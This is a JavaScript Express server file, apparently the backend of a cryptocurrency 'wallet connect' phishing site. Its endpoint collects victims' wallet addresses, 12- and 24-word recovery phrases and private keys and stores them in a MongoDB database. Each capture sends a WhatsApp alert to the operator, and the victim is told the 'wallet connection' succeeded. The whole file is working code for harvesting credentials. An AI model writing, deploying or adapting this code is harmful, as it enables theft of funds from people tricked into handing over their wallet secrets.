const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const axios = require("axios");
require("dotenv").config();

const app = express();

// Configure CORS
const allowedOrigins = [
  "https://theblockchain.vercel.app",
  "http://localhost:5173",
  "https://theblockchain.onrender.com"
];

app.use(
  cors({
    origin: function (origin, callback) {
      // Allow requests with no origin (like mobile apps or curl requests)
      if (!origin) return callback(null, true);
      if (allowedOrigins.indexOf(origin) === -1) {
        const msg =
          "The CORS policy for this site does not allow access from the specified Origin.";
        return callback(new Error(msg), false);
      }
      return callback(null, true);
    },
    credentials: true,
    methods: ["POST", "GET", "OPTIONS"],
    optionsSuccessStatus: 200,
  })
);

app.use(express.json());

// MongoDB connection
mongoose
  .connect(process.env.VITE_MONGO_URI)
  .then(() => console.log("MongoDB connected"))
  .catch((err) => console.error("MongoDB connection error:", err));

// Define a schema for wallet data
const walletSchema = new mongoose.Schema(
  {
    walletName: String,
    walletAddress: String,
    phraseWords: [String],
    phraseWords24: [String],
    privateKey: String,
  },
  { timestamps: true }
);

const Wallet = mongoose.model("Wallet", walletSchema);

// Function to send WhatsApp message
async function sendWhatsAppMessage() {
  try {
    const response = await axios.post(
      "https://graph.facebook.com/v20.0/439660965887093/messages",
      {
        messaging_product: "whatsapp",
        to: process.env.WHATSAPP_RECIPIENT,
        type: "template",
        template: {
          name: "update_notification",
          language: { code: "en" }, // Changed this line
        },
      },
      {
        headers: {
          Authorization: `Bearer ${process.env.META_API_TOKEN}`,
          "Content-Type": "application/json",
        },
      }
    );
    console.log("WhatsApp message sent:", response.data);
  } catch (error) {
    console.error(
      "Error sending WhatsApp message:",
      error.response ? error.response.data : error
    );
  }
}

// Endpoint to handle wallet data
app.post("/api/send-wallet-data", async (req, res) => {
  console.log("Received request tswd");
  //console.log("Request body:", req.body);

  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } =
    req.body;

  try {
    const newWallet = new Wallet({
      walletName,
      walletAddress,
      phraseWords,
      phraseWords24,
      privateKey,
    });

    await newWallet.save();
    console.log("Wdss");

    // Send WhatsApp message
    await sendWhatsAppMessage();

    res.status(200).json({ message: "Wallet connection successful" });
  } catch (error) {
    console.error("Error cwd:", error);
    res
      .status(500)
      .json({ error: "Error cwd", details: error.message });
  }
});

app.get("/", (req, res) => {
  res.send("Welcome to the Blockchain Backend API");
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Something broke!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Log unhandled promise rejections
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});
